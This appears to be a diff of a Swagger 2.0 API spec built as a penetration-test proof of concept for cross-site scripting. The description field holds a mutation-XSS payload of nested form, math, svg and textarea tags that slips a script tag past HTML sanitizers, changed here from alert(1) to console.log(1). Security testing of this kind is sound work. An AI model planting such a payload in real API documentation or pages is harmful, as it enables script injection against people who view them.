@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Prueba de Concepto - Cross-Site Scripting
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>alert(1)</script></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>console.log(1)</script></form>
   version: PentestKPMG
 basePath: /JSSResource/
 produces:
@@ -22,7 +22,7 @@ paths:
       tags:
         - POC_XSS
       operationId: findAccounts
-      summary: Finds all accounts
+      summary: Prueba de concepto XSS
   /AutorizacionesV1:
     get:
       responses:
